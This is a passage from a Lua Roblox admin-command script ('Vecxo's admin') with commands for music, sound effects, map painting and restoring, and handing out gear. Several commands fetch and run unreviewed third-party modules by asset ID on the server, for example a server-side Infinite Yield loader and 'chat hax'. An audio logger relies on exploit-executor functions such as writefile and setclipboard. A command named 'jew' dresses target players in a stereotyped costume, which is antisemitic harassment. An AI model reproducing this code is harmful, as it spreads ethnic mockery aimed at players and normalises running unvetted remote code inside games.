		game:GetService("Lighting").FogEnd = 100000
		game:GetService("Lighting").FogStart = 0
	end
})
--[[ coming soon
addcmd({
	Name = "fly",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			
		end
	end
})
]]
addcmd({
	Name = "startergear",
	Aliases = {"startertool"},
	Function = function(sender, targets, arguments)
		local arg = table.concat(arguments, " ", 1)
		local tool

		if arg == "" then
			if sender.Character then
				if sender.Character:FindFirstChildOfClass("Tool") then
					tool = sender.Character:FindFirstChildOfClass("Tool"):Clone()
				elseif sender.Backpack:FindFirstChildOfClass("Tool") then
					tool = sender.Backpack:FindFirstChildOfClass("Tool"):Clone()
				else
					notfi(sender, "Vecxo's admin", "No tool found in your backpack or character!")
				end
			else
				notfi(sender, "Vecxo's admin", "You dont have a character!")
			end
		else
			tool = arg
			local success, gear = pcall(function()
				return game:GetService("InsertService"):LoadAsset(tool)
			end)

			if success and gear then
				tool = gear:FindFirstChildOfClass("Tool")
			else
				notfi(sender, "Vecxo's admin", "Invalid gear id!")
			end
		end

		for i, plr in ipairs(targets) do
			local backpacktool = tool:Clone()
			backpacktool.Parent = plr.Backpack
			tool.Parent = plr.StarterGear
		end
	end
})

addcmd({
	Name = "unstartergear",
	Aliases = {"unstartertool", "nostartergear", "nostartertool"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			for i, tool in pairs(plr.StarterGear:GetChildren()) do
				tool:Destroy()
			end
		end
	end
})

addcmd({
	Name = "jew",
	Aliases = {"jewish"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			function givehat(v, hat)
				coroutine.resume(coroutine.create(function()
					if v and v.Character then
						local obj = game:service("InsertService"):LoadAsset(hat)
						for a, hat in pairs(obj:GetChildren()) do
							if hat:IsA("Accessory") or hat:IsA("Hat") then
								hat.Parent = v.Character
							end
						end
						obj:Destroy()
					end
				end))
			end
			function giveshirt(v, id)
				if v and v.Character then
					for i, c in pairs(v.Character:GetChildren()) do
						if c:IsA("Shirt") then
							c:Destroy() -- Fixed the typo
						end
					end
					local cl = Instance.new("Shirt", v.Character)
					cl.ShirtTemplate = "http://www.roblox.com/asset/?id=" .. tonumber(id - 1)
				end
			end
			function givepants(v, id)
				if v and v.Character then
					for i, c in pairs(v.Character:GetChildren()) do
						if c:IsA("Pants") then
							c:Destroy()
						end
					end
					local cl = Instance.new("Pants", v.Character)
					cl.PantsTemplate = "http://www.roblox.com/asset/?id=" .. tonumber(id - 1)
				end
			end
			for i,v in plr.Character:GetChildren() do
				if v:IsA("Accessory") then
					v:Destroy()
				end
			end
			givehat(plr, 12101418657)
			givehat(plr, 18367644870)
			givehat(plr, 8107902065)
			givehat(plr, 6133262085)
			giveshirt(plr, 159269845)
			givepants(plr, 159269873)
			-- Kozy was here im afraid
		end
	end
})

addcmd({
	Name = "musiclock",
	Aliases = {"musicloop", "lockmusic"},
	Player = false,
	Function = function(sender, targets, arguments)
		local arg = arguments[1]

		for i,v in pairs(game.Soundscape:GetChildren()) do
			if v:IsA("Sound") then
				v:Destroy()
			end
		end

		if arguments[1] then
			if arg == "n" then
				arg = "140555145345310"
			elseif arg == "t" then
				arg = "401117743"
			elseif arg == "s" then
				arg = "7713890963"
			elseif arg == "p" then
				arg = "4813706721"
			elseif arg == "m" then
				arg = "90782901177249"
			elseif arg == "m2" then
				arg = "74220076855302"
			end
		end

		if arg then
			music = Instance.new("Sound", game.Soundscape)
			music.SoundId = "rbxassetid://".. arg
			music.Name = "cxo's admin sound"

			if music.Playing == false then
				music.Playing = true
			end

			if music.Looped == false then
				music.Looped = true
			end

			if music.Volume == 0 then
				music.Volume = 1
			end

			return
		end

		if game:GetService("Workspace"):FindFirstChildOfClass("Sound") then
			music = game:GetService("Workspace"):FindFirstChild("Sound")

			local timepos = music.TimePosition

			music.Parent = game.Soundscape
			music.Name = "cxo's admin sound"

			if music.Playing == false then
				music.Playing = true
			end

			if music.Looped == false then
				music.Looped = true
			end

			if music.Volume == 0 then
				music.Volume = 1
			end

			music.TimePosition = timepos
		end
	end
})

addcmd({
	Name = "unmusiclock",
	Aliases = {"unmusicloop", "unlockmusic"},
	Player = false,
	Function = function(sender, targets, arguments)

		for i,v in pairs(game.Soundscape:GetChildren()) do
			if v:IsA("Sound") and v.Name == "cxo's admin sound" then
				v:Destroy()
			end
		end

	end
})

addcmd({
	Name = "volume",
	Aliases = {"vol"},
	Player = false,
	Function = function(sender, targets, arguments)
		local value = arguments[1]

		for i,v in pairs(game:GetDescendants()) do
			if v:IsA("Sound") then
				if not v:IsDescendantOf(game:GetService("ReplicatedStorage")) then
					v.Volume = value
				end
			end
		end

	end
})

addcmd({
	Name = "pitch",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local value = arguments[1]

		if music then
			music.PlaybackSpeed = value
		end

		local sound = game:GetService("Workspace"):FindFirstChild("Sound")
		if sound then
			sound.PlaybackSpeed = value
		end
	end
})

addcmd({
	Name = "distort",
	Aliases = {"distortion"},
	Player = false,
	Function = function(sender, targets, arguments)
		local value = arguments[1]

		if not value then
			if music and music:FindFirstChild("DistortionSoundEffect") then
				music:FindFirstChild("DistortionSoundEffect"):Destroy()
				return
			else
				local sound = game:GetService("Workspace"):FindFirstChild("Sound")
				if sound and sound:FindFirstChild("DistortionSoundEffect") then
					sound:FindFirstChild("DistortionSoundEffect"):Destroy()
					return
				end
			end
		end

		local a = Instance.new("DistortionSoundEffect")

		if music then
			if music:FindFirstChild("DistortionSoundEffect") then
				music:FindFirstChild("DistortionSoundEffect"):Destroy()
			end
			a.Parent = music
			a.Level = value
		end

		local sound = game:GetService("Workspace"):FindFirstChild("Sound")
		if sound then
			if sound:FindFirstChild("DistortionSoundEffect") then
				sound:FindFirstChild("DistortionSoundEffect"):Destroy()
			end
			a.Parent = sound
			a.Level = value
		end
	end
})

addcmd({
	Name = "echo",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local value = arguments[1]

		if not value then
			if music and music:FindFirstChild("EchoSoundEffect") then
				music:FindFirstChild("EchoSoundEffect"):Destroy()
				return
			else
				local sound = game:GetService("Workspace"):FindFirstChild("Sound")
				if sound and sound:FindFirstChild("EchoSoundEffect") then
					sound:FindFirstChild("EchoSoundEffect"):Destroy()
					return
				end
			end
		end

		local a = Instance.new("EchoSoundEffect")

		if music then
			if music:FindFirstChild("EchoSoundEffect") then
				music:FindFirstChild("EchoSoundEffect"):Destroy()
			end
			a.Parent = music
			a.Delay = value
		end

		local sound = game:GetService("Workspace"):FindFirstChild("Sound")
		if sound then
			if sound:FindFirstChild("EchoSoundEffect") then
				sound:FindFirstChild("EchoSoundEffect"):Destroy()
			end
			a.Parent = sound
			a.Delay = value
		end
	end
})
--[[
addcmd({
	Name = "reverb",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local value = arguments[1]

		if not value then
			if music and music:FindFirstChild("ReverbSoundEffect") then
				music:FindFirstChild("ReverbSoundEffect"):Destroy()
			else
				local sound = game:GetService("Workspace"):FindFirstChild("Sound")
				if sound and sound:FindFirstChild("ReverbSoundEffect") then
					sound:FindFirstChild("ReverbSoundEffect"):Destroy()
				end
			end
		end

		if not value then

		local a = Instance.new("ReverbSoundEffect")

		if music then
			a.Parent = music
			a.DecayTime = value
			a.Density = 0.5
		end

		local sound = game:GetService("Workspace"):FindFirstChild("Sound")
		if sound then
			a.Parent = sound
			a.Delay = value
		end
	end
})--]]

--[[ this is so aids on my life
addcmd({
	Name = "skatepark",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)

		notfi(sender, "Vecxo's admin", "Warning! this is laggy!")

		if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Skatepark") then
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Skatepark"):Clone().Parent = workspace
			return
		end

		require(106550662171689).load()
		repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Skatepark")
		game:GetService("ReplicatedStorage"):FindFirstChild("Skatepark"):Clone().Parent = workspace
		game:GetService("ReplicatedStorage"):FindFirstChild("Skatepark").Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
	
	end
})
]]
addcmd({
	Name = "iyss",
	Aliases = {},
	Function = function(sender, targets, arguments)
		if not restrictcheck(sender) then
			if #targets > 1 then
				notfi(sender, "Vecxo's admin", "Only one person can load this! once loaded use ;owner plr to give other people it!")
			end

			if iyloaded ~= nil then
				notfi(sender, "Vecxo's admin", "IY has already been loaded by ".. iyloaded ..", ask them to whitelist you!")
				return
			end

			for i, plr in ipairs(targets) do
				require(4696373104)(plr.Name)
				iyloaded = plr.Name
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})

addcmd({
	Name = "iy",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if not table.find(iyed, plr.UserId) then
				table.insert(iyed, plr.UserId)
			end

			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("IY") then
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr.PlayerGui
				else
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr:WaitForChild("PlayerGui")
				end
				return
			end

			local success, err = pcall(function()
				--require(14035238433)(plr.Name)
				require(100506488790924).load("IY")
			end)

			if err then
				notfi(sender, "Vecxo's admin", "IY FE failed to load")
			else
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr.PlayerGui
				else
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr:WaitForChild("PlayerGui")
				end
			end

		end
	end
})

addcmd({
	Name = "chatui",
	Aliases = {"chatgui"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if not table.find(chatter, plr.UserId) then
				table.insert(chatter, plr.UserId)
			end

			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Chat UI") then
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Chat UI"):Clone().Parent = plr.PlayerGui
				else
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Chat UI"):Clone().Parent = plr:WaitForChild("PlayerGui")
				end
				return
			end

			local success, err = pcall(function()
				require(100506488790924).load("Chat UI")
			end)

			if err then
				notfi(sender, "Vecxo's admin", "Chat UI failed to load")
			else
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Chat UI"):Clone().Parent = plr.PlayerGui
				else
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Chat UI"):Clone().Parent = plr:WaitForChild("PlayerGui")
				end
			end

		end
	end
})

addcmd({
	Name = "chathax",
	Aliases = {"chathacks"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if not table.find(chathacker, plr.UserId) then
				table.insert(chathacker, plr.UserId)
			end

			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's chat hax") then
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's chat hax"):Clone().Parent = plr.PlayerGui
				else
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's chat hax"):Clone().Parent = plr:WaitForChild("PlayerGui")
				end
				return
			end

			local success, err = pcall(function()
				require(100506488790924).load("cxo's chat hax")
			end)

			if err then
				notfi(sender, "Vecxo's admin", "chat hax failed to load")
			else
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's chat hax"):Clone().Parent = plr.PlayerGui
				else
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's chat hax"):Clone().Parent = plr:WaitForChild("PlayerGui")
				end
			end

		end
	end
})

addcmd({
	Name = "nexus",
	Aliases = {"vr"},
	Player = false,
	Function = function(sender, targets, arguments)

		if nexusloaded then
			return
		end

		local success, err = pcall(function()
			require(100506488790924).load("Nexus")
		end)

		if err then
			notfi(sender, "Vecxo's admin", "Nexus failed to load")
			return
		end

		nexusloaded = true
		repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Nexus", true)
		game:GetService("ReplicatedStorage"):FindFirstChild("Nexus", true).Parent = game:GetService("ServerScriptService")
	end
})

addcmd({
	Name = "audiologger",
	Aliases = {"alogger"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				-- https://github.com/EdgeIY
				require(100506488790924).load("AL")
				local aa = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("AL")
				aa.Parent = plr.PlayerGui
				wait(0.2)
				local GUI = aa.PopupFrame.PopupFrame
				aa.PopupFrame.Draggable = true
				local pos = 0

				local ignore = {
					"rbxasset://sounds/action_get_up.mp3",
					"rbxasset://sounds/uuhhh.mp3",
					"rbxasset://sounds/action_falling.mp3",
					"rbxasset://sounds/action_jump.mp3",
					"rbxasset://sounds/action_jump_land.mp3",
					"rbxasset://sounds/impact_water.mp3",
					"rbxasset://sounds/action_swim.mp3",
					"rbxasset://sounds/action_footsteps_plastic.mp3"
				}

				GUI.Close.MouseButton1Click:connect(function()
					GUI:TweenSize(UDim2.new(0, 360, 0, 0),"Out","Quad",0.5,true) wait(0.6)
					GUI.Parent:TweenSize(UDim2.new(0, 0, 0, 20),"Out","Quad",0.5,true) wait(0.6)
					itemadded:Disconnect()
					aa:Destroy()
				end)

				local min = false
				GUI.Minimize.MouseButton1Click:connect(function()
					if min == false then
						GUI:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) min = true
					else
						GUI:TweenSize(UDim2.new(0, 360, 0, 260),"Out","Quad",0.5,true) min = false
					end
				end)

				local function printTable(tbl)
					if type(tbl) ~= 'table' then return nil end
					local depthCount = -15

					local function run(val, inPrefix)
						depthCount = depthCount + 15
						-- if inPrefix then print(string.rep(' ', depthCount) .. '{') end
						for i,v in pairs(val) do
							if type(v) == 'table' then
								-- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {')
								GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {'
								run(v, false)
								wait()
							else
								-- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v))
								GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v)
								wait()
							end
						end
						-- print(string.rep(' ', depthCount) .. '}')
						depthCount = depthCount - 15
					end
					run(tbl, true)
				end

				local function refreshlist()
					pos = 0
					GUI.Logs.CanvasSize = UDim2.new(0,0,0,0)
					for i,v in pairs(GUI.Logs:GetChildren()) do
						v.Position = UDim2.new(0,0,0, pos)
						GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
						pos = pos+20
					end
				end

				local function FindTable(Table, Name)
					for i,v in pairs(Table) do
						if v == Name then
							return true
						end end
					return false
				end

				local function writefileExploit()
					if writefile then
						return true
					end
				end

				local writeaudio = {}
				local running = false
				GUI.SS.MouseButton1Click:connect(function()
					if writefileExploit() then
						if running == false then
							GUI.Load.Visible = true running = true
							GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
							for _, child in pairs(GUI.Logs:GetChildren()) do
								if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
									if bttn.BackgroundTransparency == 0 then
										writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
									end
								end
							end
							GUI.Store.Visible = true
							printTable(writeaudio)
							wait(0.2)
							local filename = 0
							local function write()
								local file
								pcall(function() file = readfile("Audios"..filename..".txt") end)
								if file then
									filename = filename+1
									write()
								else
									local text = tostring(GUI.Store.Text)
									text = text:gsub('\n', '\r\n')
									writefile("Audios"..filename..".txt", text)
								end
							end
							write()
							for rep = 1,10 do
								GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
								wait(0.05)
							end
							GUI.Load.Visible = false
							GUI.Load.BackgroundTransparency = 0
							GUI.Load.Size = UDim2.new(0, 0, 0, 20)
							running = false
							GUI.Store.Visible = false
							GUI.Store.Text = ''
							writeaudio = {}
						end
					else

					end
				end)

				GUI.SA.MouseButton1Click:connect(function()
					if writefileExploit() then
						if running == false then
							GUI.Load.Visible = true running = true
							GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
							for _, child in pairs(GUI.Logs:GetChildren()) do
								writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
							end
							GUI.Store.Visible = true
							printTable(writeaudio)
							wait(0.2)
							local filename = 0
							local function write()
								local file
								pcall(function() file = readfile("Audios"..filename..".txt") end)
								if file then
									filename = filename+1
									write()
								else
									local text = tostring(GUI.Store.Text)
									text = text:gsub('\n', '\r\n')
									writefile("Audios"..filename..".txt", text)
								end
							end
							write()
							for rep = 1,10 do
								GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
								wait(0.05)
							end
							GUI.Load.Visible = false
							GUI.Load.BackgroundTransparency = 0
							GUI.Load.Size = UDim2.new(0, 0, 0, 20)
							running = false
							GUI.Store.Visible = false
							GUI.Store.Text = ''
							writeaudio = {}
						end
					else

					end
				end)

				local selectedaudio = nil
				local function getaudio(place)
					if running == false then
						GUI.Load.Visible = true running = true
						GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
						for _, child in pairs(place:GetDescendants()) do
							spawn(function()
								if child:IsA("Sound") and not GUI.Logs:FindFirstChild(child.SoundId) and not FindTable(ignore,child.SoundId) then
									local id = string.match(child.SoundId, "rbxasset://sounds.+") or string.match(child.SoundId, "&hash=.+") or string.match(child.SoundId, "%d+")
									if id ~= nil then		
										local newsound = GUI.Audio:Clone()
										if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
											id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
											newsound.ImageButton.Image = 'rbxassetid://1453863294'
										end
										newsound.Parent = GUI.Logs
										newsound.Name = child.SoundId
										newsound.Visible = true
										newsound.Position = UDim2.new(0,0,0, pos)
										GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
										pos = pos+20
										local function findname()
											Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
										end
										local audioname = 'error'
										local success, message = pcall(findname)
										if success then
											newsound.TextLabel.Text = Asset.Name
											audioname = Asset.Name
										else
											newsound.TextLabel.Text = child.Name
											audioname = child.Name
										end
										local data = Instance.new('StringValue') data.Parent = newsound data.Value = child.SoundId data.Name = 'ID'
										local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
										local soundselected = false
										newsound.ImageButton.MouseButton1Click:Connect(function()
											if GUI.Info.Visible ~= true then
												if soundselected == false then soundselected = true
													newsound.ImageButton.BackgroundTransparency = 0
												else soundselected = false
													newsound.ImageButton.BackgroundTransparency = 1
												end
											end
										end)
										newsound.Click.MouseButton1Click:Connect(function()
											if GUI.Info.Visible ~= true then
												GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. child.SoundId .. "\n\nWorkspace Name: " .. child.Name
												selectedaudio = child.SoundId
												GUI.Info.Visible = true
											end
										end)
									end
								end
							end)
						end
					end
					for rep = 1,10 do
						GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
						wait(0.05)
					end
					GUI.Load.Visible = false
					GUI.Load.BackgroundTransparency = 0
					GUI.Load.Size = UDim2.new(0, 0, 0, 20)
					running = false
				end

				GUI.All.MouseButton1Click:connect(function() getaudio(game)end)
				GUI.Workspace.MouseButton1Click:connect(function() getaudio(workspace)end)
				GUI.Lighting.MouseButton1Click:connect(function() getaudio(game:GetService('Lighting'))end)
				GUI.SoundS.MouseButton1Click:connect(function() getaudio(game:GetService('SoundService'))end)
				GUI.Clr.MouseButton1Click:connect(function()
					for _, child in pairs(GUI.Logs:GetChildren()) do
						if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
							if bttn.BackgroundTransparency == 1 then
								bttn.Parent:Destroy()
								refreshlist()
							end
						end
					end
				end)
				GUI.ClrS.MouseButton1Click:connect(function()
					for _, child in pairs(GUI.Logs:GetChildren()) do
						if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
							if bttn.BackgroundTransparency == 0 then
								bttn.Parent:Destroy()
								refreshlist()
							end
						end
					end
				end)
				local autoscan = false
				GUI.AutoScan.MouseButton1Click:connect(function()
					if autoscan == false then autoscan = true
						GUI.AutoScan.BackgroundTransparency = 0.5
						notfi(plr, "Vecxo's admin", "Auto Scan ENABLED")
					else autoscan = false
						GUI.AutoScan.BackgroundTransparency = 0
						notfi(plr, "Vecxo's admin", "Auto Scan DISABLED")
					end
				end)

				local itemadded = game.DescendantAdded:connect(function(added)
					wait()
					if autoscan == true and added:IsA('Sound') and not GUI.Logs:FindFirstChild(added.SoundId) and not FindTable(ignore,added.SoundId) then
						local id = string.match(added.SoundId, "rbxasset://sounds.+") or string.match(added.SoundId, "&hash=.+") or string.match(added.SoundId, "%d+")
						if id ~= nil then		
							local newsound = GUI.Audio:Clone()
							if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
								id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
								newsound.ImageButton.Image = 'rbxassetid://1453863294'
							end
							local scrolldown = false
							newsound.Parent = GUI.Logs
							newsound.Name = added.SoundId
							newsound.Visible = true
							newsound.Position = UDim2.new(0,0,0, pos)
							if GUI.Logs.CanvasPosition.Y == GUI.Logs.CanvasSize.Y.Offset - 230 then
								scrolldown = true
							end
							GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
							pos = pos+20
							local function findname()
								Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
							end
							local audioname = 'error'
							local success, message = pcall(findname)
							if success then
								newsound.TextLabel.Text = Asset.Name
								audioname = Asset.Name
							else 
								newsound.TextLabel.Text = added.Name
								audioname = added.Name
							end
							local data = Instance.new('StringValue') data.Parent = newsound data.Value = added.SoundId data.Name = 'ID'
							local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
							local soundselected = false
							newsound.ImageButton.MouseButton1Click:Connect(function()
								if GUI.Info.Visible ~= true then
									if soundselected == false then soundselected = true
										newsound.ImageButton.BackgroundTransparency = 0
									else soundselected = false
										newsound.ImageButton.BackgroundTransparency = 1
									end
								end
							end)
							newsound.Click.MouseButton1Click:Connect(function()
								if GUI.Info.Visible ~= true then
									GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. added.SoundId .. "\n\nWorkspace Name: " .. added.Name
									selectedaudio = added.SoundId
									GUI.Info.Visible = true
								end
							end)
							--230'
							if scrolldown == true then
								GUI.Logs.CanvasPosition = Vector2.new(0, 9999999999999999999999999999999999999999999, 0, 0)
							end
						end
					end
				end)

				GUI.Info.Copy.MouseButton1Click:Connect(function()
					if pcall(function() Synapse:Copy(selectedaudio) end) then	
					else
						local clip = setclipboard or Clipboard.set
						clip(selectedaudio)
					end
				end)

				GUI.Info.Close.MouseButton1Click:Connect(function()
					GUI.Info.Visible = false
					for _, sound in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
						if sound.Name == 'SampleSound' then
							sound:Destroy()
						end
					end
					GUI.Info.Listen.Text = 'Listen'
				end)

				GUI.Info.Listen.MouseButton1Click:Connect(function()
					if GUI.Info.Listen.Text == 'Listen' then
						local samplesound = Instance.new('Sound') samplesound.Parent = plr.PlayerGui
						samplesound.Looped = true samplesound.SoundId = selectedaudio samplesound:Play() samplesound.Name = 'SampleSound'
						samplesound.Volume = 2.5
						GUI.Info.Listen.Text = 'Stop'
					else
						for _, sound in pairs(plr.PlayerGui:GetChildren()) do
							if sound.Name == 'SampleSound' then
								sound:Destroy()
							end
						end
						GUI.Info.Listen.Text = 'Listen'
					end
				end)

				local function drag(gui)
					spawn(function()
						local UserInputService = game:GetService("UserInputService")
						local dragging
						local dragInput
						local dragStart
						local startPos
						local function update(input)
							local delta = input.Position - dragStart
							gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), "InOut", "Quart", 0.04, true, nil) 
						end
						gui.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
								dragging = true
								dragStart = input.Position
								startPos = gui.Position
								input.Changed:Connect(function()
									if input.UserInputState == Enum.UserInputState.End then
										dragging = false
									end
								end)
							end
						end)
						gui.InputChanged:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
								dragInput = input
							end
						end)
						UserInputService.InputChanged:Connect(function(input)
							if input == dragInput and dragging then
								update(input)
							end
						end)
					end)
				end
				drag(aa.PopupFrame)
			end)
		end
	end
})

addcmd({
	Name = "dodgeball",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			local success, err = pcall(function()
				require(4722391208).load(plr.Name)
			end)

			if err then
				notfi(sender, "Vecxo's admin", "Failed to load dodgeball for ".. plr.Name)
			end

		end
	end
})

addcmd({
	Name = "partmoving",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local torf = table.concat(arguments, " ", 1)

		if torf ~= "true" and torf ~= "false" then
			notfi(sender, "Vecxo's admin", "The values are true or false! example: ".. _G.prefix .."partmoving false")
		end

		local bool = (torf == "true")

		_G.allowunpunishwelding = bool

	end
})

addcmd({
	Name = "paintmap",
	Aliases = {"paintall"},
	Player = false,
	Function = function(sender, targets, arguments)
		local r, g, b

		if #arguments > 0 and (#arguments < 2 and (arguments[1]:lower() == "random" or arguments[1]:lower() == "mess")) then
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") and v.Name ~= "Terrain" then
					v.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
				end
			end
			return
		end

		if #arguments < 1 then
			r, g, b = math.random(0, 255), math.random(0, 255), math.random(0, 255)
		else
			r = tonumber(arguments[1])
			g = tonumber(arguments[2]) or 0
			b = tonumber(arguments[3]) or 0
		end

		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Color = Color3.fromRGB(r, g, b)
			end
		end
	end
})

addcmd({
	Name = "restoremap",
	Aliases = {"rmap"},
	Player = false,
	Function = function(sender, targets, arguments)

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Tabby") then
			require(100506488790924).load("Kah")
		end

		local Tabby = workspace:FindFirstChild("Tabby")
		local _Game = workspace.Terrain:FindFirstChild("_Game")

		if not (Tabby and _Game) then
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("Tabby"):Clone().Parent = workspace
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("_Game"):Clone().Parent = workspace.Terrain

			if game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin") then
				game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = false
				task.wait()
				game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = true
			end

			if game:GetService("ServerScriptService"):FindFirstChild("Killer") then
				game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = false
				task.wait()
				game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = true
			end -- restarts so that the touched works

			if game:GetService("ServerScriptService"):FindFirstChild("Regen") then
				game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = false
				task.wait()
				game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = true
			end -- restarts so that regening the admin blocks works

			return
		end

		game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("Tabby"):Clone().Parent = workspace
		Tabby:Destroy()

		game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("_Game"):Clone().Parent = workspace.Terrain
		_Game:Destroy()

		if game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin") then
			game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = false
			task.wait()
			game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = true
		end -- restarts so that pads work

		if game:GetService("ServerScriptService"):FindFirstChild("Killer") then
			game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = false
			task.wait()
			game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = true
		end -- restarts so that the touched works

		if game:GetService("ServerScriptService"):FindFirstChild("Regen") then
			game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = false
			task.wait()
			game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = true
		end -- restarts so that regening the admin blocks works

--[[
		local tparts = {}
		local gparts = {}

